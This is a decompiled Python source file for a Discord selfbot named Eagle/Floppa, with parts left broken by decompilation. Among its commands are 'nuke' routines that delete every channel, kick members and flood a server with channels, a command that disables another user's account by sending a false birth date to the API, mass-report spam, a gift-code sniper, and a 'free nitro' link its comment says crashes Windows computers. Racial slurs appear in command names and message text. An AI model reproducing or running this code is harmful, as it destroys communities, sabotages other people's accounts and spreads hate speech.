import asyncio, datetime, io, json, os, random, string
from random import randint
import time
from itertools import cycle
import time, aiohttp, colorama, os, time
from discord.client import Client
from discord.ext.commands.converter import ColorConverter
import requests
from colorama import Fore
from discord.ext import commands
import discord, base64, os, requests
from colorama import *
import colorama
from colorama import Fore as Color
import urllib, math
from gtts import gTTS
from requests.api import post
import sys, os, time, socket, random, datetime, subprocess
with open('settings.json') as (f):
    config = json.load(f)
    f.close()
with open('data/tts.json') as (f):
    data = json.load(f)
    f.close()
tts_language = data.get('tts_language')
print('Loading...')
print('Meantime check out some of my other projects')
print('https://github.com/MvpAlej')
purple_dark = 6946922
jitcolor = 11306589
now = datetime.datetime.now()
green_dark = 2801780
kiss_description = ['kiss kiss nigga lol', 'Wakey wakey', '😳']
thumbnails = [
 'https://c.tenor.com/vIl4cwsqWIgAAAAd/floppa.gif', 'https://c.tenor.com/OopQEwuVpVAAAAAd/floppagif-floppa.gif', 'https://c.tenor.com/63wDeS1kHtAAAAAd/floppa.gif', 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0ztFztKEv1aRsrF8ag0NaGb7AZ4vCRh_wTRWEaQqTaWBOph7AxBnuiCAKuHVPpTTWzjM&usqp=CAU']
vape = random.choice(thumbnails)
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()
title = 'Eagle Selfbot'
import asyncio
del_sec = 60
desc = '{Eagle.user.name} Used your selfbot '
daddy = post
kojimu = daddy
loveofmylife = kojimu
status = ''
sendfun = '.fun'
token = config.get('token')
prefix = config.get('prefix')
nukedchannels = config.get('nukedchannels')
nukedchannels2 = config.get('nukedchannels2')
nukedchannels3 = config.get('nukedchannels3')
textuwu = '.help command to use'
nukedchannelname = config.get('servername1')
nukedchannelname2 = config.get('servername2')
nukedchannelname3 = config.get('servername3')
nukedchannelname4 = config.get('servername4')
start = datetime.datetime.now()
import json, os, re, json
from urllib.request import Request, urlopen
from time import sleep
import requests
print('Done')
print('If it gives an error check through your tokens in token.txt')

def command():
    print('\n    \n█████╗ ███╗   ███╗██╗███████╗\n██╔══██╗████╗ ████║██║╚══███╔╝\n███████║██╔████╔██║██║  ███╔╝ \n██╔══██║██║╚██╔╝██║██║ ███╔╝  \n██║  ██║██║ ╚═╝ ██║██║███████╗\n╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝\n                              \n=====================================\n    '.replace('█', f"{Fore.WHITE}█{Fore.RED}"))


boi = 11306589

def RandomColor():
    randcolor = discord.Color(random.randint(0, 16777215))
    return randcolor


from discord import Webhook, RequestsWebhookAdapter
colorama.init()
Eagle = discord.Client()
Eagle = commands.Bot(description='Eagle ', command_prefix=prefix, self_bot=True)
Eagle.remove_command('help')
Egirl = Eagle

class Login(discord.Client):

    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print('')
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print('-------------------------------')


print('\n\n |\\__/,|   (` |_ _  |.--.) )\n ( T   )     /\n(((^_(((/(((_/\n')
hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
site = requests.get('https://raw.githubusercontent.com/StvnedEagle/CouldtheyBeStopped/main/whitelist')
import functools

def async_executor():

    def outer(func):

        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = (functools.partial)(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer


@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=(message.lower()), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f


@Eagle.command()
async def tts(ctx, *, message):
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=(discord.File(buff, f"{message}.wav")))


print('Success.')

def hwidwhitelist():
    if hardwareid in site.text:
        pass
    else:
        print('[ERROR] HWID NOT in database')
        time.sleep(3)
        sys.exit()


def sss():
    import requests, os, shutil, re, psutil
    from tqdm import tqdm
    from zipfile import ZipFile
    from time import sleep
    from bs4 import BeautifulSoup
    from colorama import Fore, Style
    header = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36',
     'X-Requested-With':'XMLHttpRequest'}
    url = 'https://github.com/x1mv/updatecheck/releases/latest'
    print('Checking For Updates. . .')
    for i in tqdm((range(100)), desc='Searching for updates. . .',
      ascii=False,
      ncols=100):
        sleep(0.003)

    r = requests.get(url, headers=header)
    THIS_VERSION = '1.3.1'
    soup = str(BeautifulSoup(r.text, 'html.parser'))
    s1 = re.search('<title>', soup)
    s2 = re.search('·', soup)
    result_string = soup[s1.end():s2.start()]
    if THIS_VERSION not in result_string:
        print('New Update Found')
        print(f"{Fore.LIGHTRED_EX}Outdated Vers: {THIS_VERSION}", end='\n\n')
        print('Downloading New Version...')
        if psutil.Process(os.getpid()).name() == 'FloppaSB.exe':
            try:
                new_version = requests.get('https://github.com/x1mv/floppawhitelist/archive/refs/heads/main.zip')
                with open('HazardNuker.zip', 'wb') as (zipfile):
                    zipfile.write(new_version.content)
                with ZipFile('HazardNuker.zip', 'r') as (filezip):
                    filezip.extractall()
                os.remove('HazardNuker.zip')
            except Exception as err:
                sleep(5)


def Init():
    token = config.get('token')
    try:
        hwidwhitelist()
        Eagle.run(token, bot=False, reconnect=True)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Invalid token lol" + Fore.RESET)
        os.system('pause  >  NUL')


@Eagle.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    link = str(r['image'])
    em = discord.Embed()
    em.set_author(name='Fox lel | Floppa Selfbot')
    em.set_image(url=(r['image']))
    await ctx.send(embed=em)


@Eagle.command()
async def botinvite(ctx, id):
    global inlined
    global jitcolor
    if '@' in id:
        id.replace('@', '')
    await ctx.message.delete()
    invgen = '[>] https://discord.com/oauth2/authorize?client_id=' + id + '&permissions=8&scope=bot'
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_author(name=('Bot Inviter | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
    embed.set_thumbnail(url=vape)
    embed.set_image(url='')
    embed.add_field(name='Bot Invite:', value=f"<@{id}> \n {invgen}", inline=inlined)
    embed.set_footer(text=themefooter)
    await ctx.send(embed=embed, delete_after=30)


token = os.getenv('secret')
prefix = config.get('prefix')

@Eagle.command()
async def pi(ctx):
    pi = 3.141592653589793
    await ctx.send(math.sin(pi) + math.sqrt(math.e))


@Eagle.command()
async def gp(ctx, mention=None):
    if mention is None:
        print("User Didn't provide a mention")
    await ctx.message.delete()
    print('Action Completed: gp')


@Eagle.command(aliases=['purgebans', 'unbanall'])
async def massunban(ctx):
    await ctx.message.delete()
    Eagle
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=(users.user))
        except:
            pass


@Eagle.command()
async def softnuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{ColorConverter.WHITE}{channel.name} {Color.GREEN}was deleted in {Color.WHITE}{guild.name}")
        except:
            print(f"{Color.WHITE}{channel.name} {Color.RED}was not deleted in {Color.WHITE}{guild.name}")

    for member in guild.members:
        try:
            await member.kick()
            print(f"{Color.WHITE}{member.name}#{member.discriminator} {Color.GREEN}was banned in {Color.WHITE}{guild.name}")
        except:
            print(f"{Color.WHITE}{member.name}#{member.discriminator} {Color.RED}was not banned in {Color.WHITE}{guild.name}")

    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    while True:
        await guild.create_text_channel('nuked')
        time.sleep(5)
        break

    print(f"{Color.YELLOW}[{datetime.now()} UTC]{Color.WHITE}\n{guild.name}{Color.GREEN} was nuked successfully.{Color.WHITE}\n")


@Eagle.command()
async def setbanner(ctx, *, banner=None):
    await ctx.message.delete()
    if ctx.message.attachments:
        image = await ctx.message.attachments[0].read()
    else:
        if banner:
            async with aiohttp.ClientSession() as session:
                async with session.get(banner) as resp:
                    image = await resp.read()
    await ctx.guild.edit(banner=image)
    await ctx.send('Banner updated')


async def spamchannels(ctx):
    for i in range(200):
        await ctx.guild.create_text_channel(name='stonedeagle is daddy')


@Egirl.command()
async def n(ctx):
    guild = ctx.guild
    try:
        for emoji in ctx.guild.emojis:
            await emoji.delete()
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")

    except:
        pass

    for member in ctx.guild.members:
        try:
            await member.edit(nick='stonedeaglerunsu')
        except discord.Forbidden:
            print(f"{member.name} has NOT been renamed to in {ctx.guild.name}")
        else:
            print(f"{member.name} has been renamed to in {ctx.guild.name}")

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    await spamchannels()


themefooter = 'Floppa selfbot'

@Eagle.command()
async def spamrename(ctx):
    await ctx.guild.edit(name=nukedchannelname)
    while True:
        await ctx.guild.edit(name=nukedchannelname2)
        await ctx.guild.edit(name=nukedchannelname3)
        await ctx.guild.edit(name=nukedchannelname4)
        await ctx.guild.edit(name='stoned.eagle was here ')
        await ctx.guild.edit(name='stoned.eagle LO')


import threading

@Eagle.command()
async def spam(ctx, amount: int, *, message):
    for i in range(amount):
        await ctx.send(message)


@Eagle.command()
async def termtoken(ctx, token):
    await ctx.message.delete()
    headers = {'Authorization':token,  'Content-Type':'application/json'}
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        r = requests.patch('https://discordapp.com/api/v8/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
        if r.status_code == 400:
            print(f"{Fore.LIGHTBLUE_EX}[INFO] - Disabled Token\n")
            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
            embed.set_image(url='')
            embed.description = '**Disabled Token succesfully**              \n\n'
            await ctx.send(embed=embed, delete_after=30)
            await ctx.send(embed=embed)
            while True:
                input()
                os.system('cls; clear')

        else:
            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
            embed.set_image(url='')
            embed.description = '**Couldnt Disable Token **              \n\n'
            await ctx.send(embed=embed, delete_after=30)
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
        embed.set_thumbnail(url='https://pbs.twimg.com/media/Ed9pGmlXgAcCrnL.png')
        embed.add_field(name='Invalid Token', value='Use a valid token to term')
        embed.set_footer(text=themefooter)
        await ctx.send(embed=embed, delete_after=30)


@Eagle.command()
async def cleardms--- This code section failed: ---

 L. 453         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_ATTR                delete
                6  CALL_FUNCTION_0       0  '0 positional arguments'
                8  GET_AWAITABLE
               10  LOAD_CONST               None
               12  YIELD_FROM
               14  POP_TOP

 L. 454        16  SETUP_LOOP          148  'to 148'
               18  LOAD_GLOBAL              Eagle
               20  LOAD_ATTR                private_channels
               22  GET_ITER
               24  FOR_ITER            146  'to 146'
               26  STORE_FAST               'channel'

 L. 455        28  LOAD_GLOBAL              isinstance
               30  LOAD_FAST                'channel'
               32  LOAD_GLOBAL              discord
               34  LOAD_ATTR                DMChannel
               36  CALL_FUNCTION_2       2  '2 positional arguments'
               38  POP_JUMP_IF_FALSE    24  'to 24'

 L. 456        40  SETUP_LOOP          144  'to 144'
               42  LOAD_FAST                'channel'
               44  LOAD_ATTR                history
               46  LOAD_CONST               9999
               48  LOAD_CONST               ('limit',)
               50  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               52  GET_AITER
               54  LOAD_CONST               None
               56  YIELD_FROM
               58  SETUP_EXCEPT         72  'to 72'
               60  GET_ANEXT
               62  LOAD_CONST               None
               64  YIELD_FROM
               66  STORE_FAST               'msg'
               68  POP_BLOCK
               70  JUMP_FORWARD         94  'to 94'
             72_0  COME_FROM_EXCEPT     58  '58'
               72  DUP_TOP
               74  LOAD_GLOBAL              StopAsyncIteration
               76  COMPARE_OP               exception-match
               78  POP_JUMP_IF_FALSE    92  'to 92'
               80  POP_TOP
               82  POP_TOP
               84  POP_TOP
               86  POP_EXCEPT
               88  POP_BLOCK
               90  JUMP_BACK            24  'to 24'
               92  END_FINALLY
             94_0  COME_FROM            70  '70'

 L. 457        94  SETUP_EXCEPT        126  'to 126'

 L. 458        96  LOAD_FAST                'msg'
               98  LOAD_ATTR                author
              100  LOAD_GLOBAL              Eagle
              102  LOAD_ATTR                user
              104  COMPARE_OP               ==
              106  POP_JUMP_IF_FALSE   122  'to 122'

 L. 459       108  LOAD_FAST                'msg'
              110  LOAD_ATTR                delete
              112  CALL_FUNCTION_0       0  '0 positional arguments'
              114  GET_AWAITABLE
              116  LOAD_CONST               None
              118  YIELD_FROM
              120  POP_TOP
            122_0  COME_FROM           106  '106'
              122  POP_BLOCK
              124  JUMP_BACK            58  'to 58'
            126_0  COME_FROM_EXCEPT     94  '94'

 L. 460       126  POP_TOP
              128  POP_TOP
              130  POP_TOP

 L. 461       132  POP_EXCEPT
              134  JUMP_BACK            58  'to 58'
              136  END_FINALLY
              138  JUMP_BACK            58  'to 58'
              140  POP_BLOCK
            142_0  COME_FROM_LOOP       40  '40'
              142  CONTINUE             24  'to 24'
              144  JUMP_BACK            24  'to 24'
              146  POP_BLOCK
            148_0  COME_FROM_LOOP       16  '16'

Parse error at or near `JUMP_BACK' instruction at offset 90


cuh = []

@Eagle.command()
async def fuckniggers(ctx):
    a = 1
    counters = a + 1


@Eagle.command()
async def fun(ctx):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = 'Meme Pages\n - **help fun** - First fun page\n - **help fun2** - second meme page'
    await ctx.send(embed=embed, delete_after=30)


import discord, base64, asyncio

@Eagle.command()
async def theme(ctx):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = '`Theme Commands`\n - **Fire** - Fire theme\n - **ice** - Ice Theme\n - **inline** - Inline Mode\n - **floppa* - Floppa theme'
    await ctx.send(embed=embed, delete_after=10)


@Eagle.command()
async def status(ctx):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = ' `Theme Commands`\n - **Fire** - Fire theme\n - **ice** - Ice Theme\n                '
    await ctx.send(embed=embed, delete_after=10)


@Eagle.command()
async def secretify(ctx, *, message: str):
    out = ''
    for letter in message:
        out += f"||{letter}||"

    await ctx.message.edit(content=out)


headers = {'authorization': token}
headers = {'authorization': token}
connect = requests.get('https://canary.discordapp.com/api/v6/users/@me',
  headers=headers)

@Eagle.command()
async def utility(ctx, *, category=None):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = ' - **Mc**  -   Shows member count\n - **Ignore**  -   Reads Guilds\n - **Bots**  -   Testing command idgaf bout - \n - **massunblock**  -   Unblocks Everyone lmfao tf else is it gonna do\n - **picture [query]**    Sends an image based on your query\n - **iplocate**  -   locate ip, GG Fatass IP logger (Me) :c\n - **Help**  -   Literally tells you to look in console\n - **nitro**  -  Random Nitro Code\n - **massunban**  -   Unbans everyone, did you get nuked? tf?\n - **av**  -   Get Someones Avatar\n - **changenickname**  -   Changes user nickname lel\n - **lockdown** -   Locks chat down\n - **cleardms** - clears your dms\n - **encode** - Encode to base64\n - **decode** - Decode something from base64 lol fuck else it gonna do\n - **cs** - copy a server\n - **emojispoofer** - spoofs emoji\n - **tempban** - Temporary ban for amount of seconds\n - **pi** - Shows pi number rounded idfk\n - **serverinfo** - get server info\n - **give** - Give role to someone \n - **take** - take a role from someone\n - **emojis** - list emojis in server (broken)\n - **bans** - Show a list of banned people\n - **utility2** - Second Utility Page'
    await ctx.send(embed=embed, delete_after=30)


@Eagle.command()
async def crypto(ctx):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = ' `Crypto commands`\n - **daily** - Get Daily price of btc and eth \n - **btc** - BTC price lmfao retard \n - **eth** - Get ETH price\n - **usdbtc** - converts usd to btc\n - **usdeth** - convert usd to eth\n - **bitcoin** - bitcoin price alternative'
    await ctx.send(embed=embed, delete_after=30)


@Eagle.command()
async def image(ctx):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = ' `imaging`\n - **Tweet** - Tweet a Message lel \n - **phcomment** - phcomment LOL so funni haha \n - **imaage** - Search up an image\n - **fry** - Fry a user :weary:\n - **revpfp** - Search up a pfp skidded command lol\n - **av** - get a users discord avatar\n - **gif** - Gif search\n - **fox** - Fox Picture\n - **cat** - Cat Picture'
    await ctx.send(embed=embed, delete_after=30)


@Eagle.command()
async def anime(ctx):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = ' `imaging`\n - **Tweet** - Tweet a Message lel \n - **phcomment** - phcomment LOL so funni haha \n - **imaage** - Search up an image\n - **fry** - Fry a user :weary:\n - **revpfp** - Search up a pfp skidded command lol\n - **av** - get a users discord avatar\n - **gif** - Gif search'
    await ctx.send(embed=embed, delete_after=30)


@Eagle.command()
async def mreport(ctx, messagee):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_author(name=('Mass Report' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
    embed.set_thumbnail(url='')
    embed.set_image(url='')
    embed.add_field(name='Succesfully Started Mass Report on:', value=f"**{messagee}**", inline=inlined)
    embed.set_footer(text=themefooter)
    await ctx.send(embed=embed, delete_after=30)
    print('=========================================')
    print(f"Mass Report on {messagee} Started:")

    def reporter(self):
        report = requests.post('https://discordapp.com/api/v8/report',
          json={'message_id':messagee,
         'guild_id':'Current',
         'reason':'Every'},
          headers={'Accept':'*/*',
         'Accept-Encoding':'gzip, deflate',
         'Accept-Language':'sv-SE',
         'User-Agent':'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
         'Content-Type':'application/json',
         'Authorization':self.TOKEN})

    def _multi_threading(self):
        threading.Thread(target=(self._update_title)).start()
        while threading.active_count() <= 300:
            threading.Thread(target=(self._reporter)).start()

    def sadness():
        r = requests.post('https://discord.com/api/v6/report', headers=headers, json=messagee)

    reportcounter = 1
    while True:
        print(f"Times: {reportcounter}")
        reportcounter += 1
        time.sleep(1)
        print(f"Times: {reportcounter}")
        time.sleep(1)


init()
data = {}
with open('settings.json') as (sex):
    data = json.load(sex)
codeRegex = re.compile('(discord.com/gifts/|discordapp.com/gifts/|discord.gift/)([a-zA-Z0-9]+)')

@Eagle.event
async def on_message(ctx):
    Floppasniper = config.get('Floppasniper')
    if Floppasniper == 'True':
        if codeRegex.search(ctx.content):
            print((Fore.LIGHTBLUE_EX + time.strftime('%H:%M:%S ', time.localtime()) + Fore.RESET), end='')
            code = codeRegex.search(ctx.content).group(2)
            start_time = time.time()
            if len(code) < 16:
                try:
                    print(Fore.RED + '[INVALID] -  Invalid Code: ' + code + ' From ' + ctx.author.name + '#' + ctx.author.discriminator + '. |' + ctx.jump_url)
                except:
                    print(Fore.RED + '[INVALID]  - Invalid Code | ' + code + ' From ' + ctx.author.name + '#' + ctx.author.discriminator + Fore.RESET)

            else:
                async with Client() as client:
                    result = await client.post(('https://discordapp.com/api/v6/entitlements/gift-codes/' + code + '/redeem'),
                      json={'channel_id': str(ctx.channel.id)},
                      headers={'authorization':token,
                     'user-agent':'Mozilla/5.0'})
                    delay = time.time() - start_time
                    try:
                        print(Fore.LIGHTGREEN_EX + '[-] Sniped code: ' + Fore.LIGHTRED_EX + code + Fore.RESET + ' From ' + ctx.author.name + '#' + ctx.author.discriminator + Fore.LIGHTMAGENTA_EX + ' [' + ctx.guild.name + ' > ' + ctx.channel.name + ']' + Fore.RESET)
                    except:
                        print(Fore.LIGHTGREEN_EX + '[-] Sniped code: ' + Fore.LIGHTRED_EX + code + Fore.RESET + ' From ' + ctx.author.name + '#' + ctx.author.discriminator + Fore.RESET)

                if 'This gift has been redeemed already' in str(result.content):
                    print((Fore.LIGHTBLUE_EX + time.strftime('%H:%M:%S ', time.localtime()) + Fore.RESET), end='')
                    print((Fore.LIGHTYELLOW_EX + '[REDEEMED] - Code has been already redeemed' + Fore.RESET), end='')
                else:
                    if 'nitro' in str(result.content):
                        print((Fore.LIGHTBLUE_EX + time.strftime('%H:%M:%S ', time.localtime()) + Fore.RESET), end='')
                        print((Fore.GREEN + f"[SNIPED] - GG, Nitro Applied to{Eagle.user}" + Fore.RESET), end='')
                    else:
                        if 'Unknown Gift Code' in str(result.content):
                            print((Fore.LIGHTBLUE_EX + time.strftime('%H:%M:%S ', time.localtime()) + Fore.RESET), end='')
                            print((Fore.LIGHTRED_EX + '[-] Invalid Code' + Fore.RESET), end=' ')
                print(' Delay:' + Fore.GREEN + ' %.3fs' % delay + Fore.RESET)
        else:
            if '**giveaway**' in str(ctx.content).lower() or 'react with' in str(ctx.content).lower() and 'giveaway' in str(ctx.content).lower():
                try:
                    await asyncio.sleep(randint(100, 200))
                    await ctx.add_reaction('🎉')
                    print((Fore.LIGHTBLUE_EX + time.strftime('%H:%M:%S ', time.localtime()) + Fore.RESET), end='')
                    print(Fore.LIGHTYELLOW_EX + '[-] Enter Giveaway ' + Fore.LIGHTMAGENTA_EX + ' [' + ctx.guild.name + ' > ' + ctx.channel.name + ']' + Fore.RESET)
                except:
                    print((Fore.LIGHTBLUE_EX + time.strftime('%H:%M:%S ', time.localtime()) + Fore.RESET), end='')
                    print(Fore.RED + '[ERROR] - Something went wrong with Giveaway Sniper ' + Fore.LIGHTMAGENTA_EX + ' [' + ctx.guild.name + ' > ' + ctx.channel.name + ']' + Fore.RESET)

            else:
                if '<@' + str(Eagle.user.id) + '>' in ctx.content:
                    if 'giveaway' in str(ctx.content).lower() or 'won' in ctx.content or 'winner' in str(ctx.content).lower():
                        print((Fore.LIGHTBLUE_EX + time.strftime('%H:%M:%S ', time.localtime()) + Fore.RESET), end='')
                        try:
                            won = re.search('You won the \\*\\*(.*)\\*\\*', ctx.content).group(1)
                        except:
                            won = 'UNKNOWN'

                        print(Fore.GREEN + '[GIVEAWAY] - Giveaway Won: ' + Fore.LIGHTCYAN_EX + won + Fore.LIGHTMAGENTA_EX + ' [' + ctx.guild.name + ' > ' + ctx.channel.name + ']' + Fore.RESET)
    await Eagle.process_commands(ctx)


@Eagle.command()
async def autofarm(ctx):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = ' - **mee6** - Auto Mee6 \n - **pls** - Auto Dank memer'
    await ctx.send(embed=embed, delete_after=30)


@Eagle.command()
async def emoticon(ctx):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = ' `Emoticon Commands`\n - **lenny** - lenny face\n - **magic** - magic lenny\n - **angrytableflip**\n - **wtf** - Wtf face\n - **happylenny** - happy lenny\n - **gunlenny** - gun lenny\n - **crosseye** - cross eyed lenny\n '
    await ctx.send(embed=embed, delete_after=10)


command()
settings = config.get
Floppasniper = settings('floppasniper')

def enabledordisabled():
    print(f"{Fore.LIGHTBLUE_EX}[CONNECTED] - Connected to {Eagle.user.name}#{Eagle.user.discriminator} [Guilds: {len(Eagle.guilds)}]")


print(f"{Fore.LIGHTYELLOW_EX}[Booting Up Floppa...]")

@Eagle.event
async def on_ready():
    print(f"{Fore.LIGHTBLUE_EX}[CONNECTED] - Connected to {Eagle.user.name}#{Eagle.user.discriminator} [Guilds: {len(Eagle.guilds)}]")
    if Floppasniper == 'True':
        print('[ENABLED] - Floppa Sniper is ENABLED')
    else:
        print('[DISABLED] - Floppa Sniper is DISABLED')


@Eagle.command()
async def cookie(ctx):
    await ctx.send(content="(  ' - ')-🍪")


@Eagle.command()
async def magic(ctx):
    await ctx.send(content='(∩ ͡° ͜ʖ ͡°)⊃━☆ﾟ')


@Eagle.command()
async def wtf(ctx):
    await ctx.message.delete()
    await ctx.send('Ծ_Ծ')


@Eagle.command()
async def eml(ctx, no_of_lines: int=4):
    for _ in range(no_of_lines):
        await ctx.invoke(Eagle.get_command('rc'), 200, 5, False)


@Eagle.command()
async def angrytableflip(ctx):
    await ctx.message.delete()
    await ctx.send('(ノಠ益ಠ)ノ彡┻━┻')


@Eagle.command()
async def lenny(ctx):
    await ctx.send(content='(( ͡° ͜ʖ ͡°)')


@Eagle.command()
async def crosseye(ctx):
    await ctx.send(content='(◑‿◐)')


@Eagle.command()
async def cutelenny(ctx):
    await ctx.send(content='( ͡ᵔ ͜ʖ ͡ᵔ )')


@Eagle.command()
async def gunlenny(ctx):
    await ctx.send(content='ᕦ(▀̿ ̿ -▀̿ ̿ )つ/̵͇̿̿/’̿’̿ ̿ ̿̿ ̿̿ ̿̿')


@Eagle.command()
async def beamed(ctx):
    await ctx.send(content='(((   ◑‿◐))>-- get beaameddd LMFAO')


import inspect

@Eagle.command()
async def source(ctx, *, command):
    """See the source code for any command."""
    source = str(inspect.getsource(Eagle.get_command(command).callback))
    fmt = '**`py\n' + source.replace('`', '\u200b`') + '\n**`'
    if len(fmt) > 2000:
        async with ctx.session.post('https://hastebin.com/documents', data=source) as resp:
            data = await resp.json()
        key = data['key']
        return await ctx.send(f"Command source: <https://hastebin.com/{key}.py>")
    else:
        return await ctx.send(fmt)


@Eagle.command()
async def basedcow(ctx):
    cnt = '**`\n__________\n|        |\n| Fuck   |\n| blacks |\n|        |\n¯¯¯¯¯¯¯¯¯¯\n    \\   ^__^\n        \\  (oo)\\_______\n        (__)\\       )\\/\n            ||----w |\n            ||     ||\n**`'
    em = discord.Embed(color=(random.randint(0, 16777215)))
    em.description = cnt
    await ctx.send(embed=em)
    await ctx.message.delete()


@Eagle.command()
async def fatal(ctx):
    """Sends a link when clicked rapes a windwos computer"""
    await ctx.message.delete()
    await ctx.send('Click this for free nitro! <ms-cxh-full://0>')


gitcredit = 'https://github.com/MvpAlej/Eagle-SelfBot'

@Eagle.command()
async def uptime(ctx):
    await ctx.message.delete()
    uptime = datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_author(name=('Uptime Command | Eagle Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
    embed.set_thumbnail(url=(random.choice(thumbnails)))
    embed.set_image(url='')
    embed.add_field(name='Eagle Selfbot Runtime', value=f"Running for {uptime} ", inline=False)
    embed.set_footer(text=(f"{gitcredit}"))
    await ctx.send(embed=embed, delete_after=30)


def GenAddress(addy: str):
    letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    four_char = ''.join(random.choice(letters) for _ in range(4))
    should_abbreviate = random.randint(0, 1)
    if should_abbreviate == 0:
        if 'street' in addy.lower():
            addy = addy.replace('Street', 'St.')
            addy = addy.replace('street', 'St.')
        else:
            if 'st.' in addy.lower():
                addy = addy.replace('st.', 'Street')
                addy = addy.replace('St.', 'Street')
            else:
                if 'court' in addy.lower():
                    addy = addy.replace('court', 'Ct.')
                    addy = addy.replace('Court', 'Ct.')
                else:
                    if 'ct.' in addy.lower():
                        addy = addy.replace('ct.', 'Court')
                        addy = addy.replace('Ct.', 'Court')
                    else:
                        if 'rd.' in addy.lower():
                            addy = addy.replace('rd.', 'Road')
                            addy = addy.replace('Rd.', 'Road')
                        else:
                            if 'road' in addy.lower():
                                addy = addy.replace('road', 'Rd.')
                                addy = addy.replace('Road', 'Rd.')
                            if 'dr.' in addy.lower():
                                addy = addy.replace('dr.', 'Drive')
                                addy = addy.replace('Dr.', 'Drive')
                            else:
                                if 'drive' in addy.lower():
                                    addy = addy.replace('drive', 'Dr.')
                                    addy = addy.replace('Drive', 'Dr.')
                                if 'ln.' in addy.lower():
                                    addy = addy.replace('ln.', 'Lane')
                                    addy = addy.replace('Ln.', 'Lane')
                                elif 'lane' in addy.lower():
                                    addy = addy.replace('lane', 'Ln.')
                                    addy = addy.replace('lane', 'Ln.')
    random_number = random.randint(1, 99)
    extra_list = ['Apartment', 'Unit', 'Room']
    random_extra = random.choice(extra_list)
    return four_char + ' ' + addy + ' ' + random_extra + ' ' + str(random_number)


@Eagle.command()
async def address(ctx, *, text):
    await ctx.message.delete()
    addy = ' '.join(text)
    address_array = []
    i = 0
    while i < 10:
        address_array.append(GenAddress(addy))
        i += 1

    final_str = '\n'.join(address_array)
    em = discord.Embed(description=final_str)
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(final_str)


@Eagle.command()
async def copy(ctx):
    await ctx.message.delete()
    await Eagle.create_guild(f"Eagle Runs {ctx.guild.name}")
    await asyncio.sleep(4)
    for g in Eagle.guilds:
        if f"Eagle Runs {ctx.guild.name}" in g.name:
            for c in g.channels:
                await c.delete()

            for cate in ctx.guild.categories:
                x = await g.create_category((f"{cate.name}"))
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel((f"{chann}"))
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel((f"{chann}"))

    try:
        await g.edit(icon=(ctx.guild.icon_url))
    except:
        pass


@Eagle.command()
async def keyword(ctx, *, word: str):
    channel = Eagle.get_channel(ctx.channel)
    messages = await ctx.channel.history(limit=200).flatten()
    for msg in messages:
        if word in msg.content:
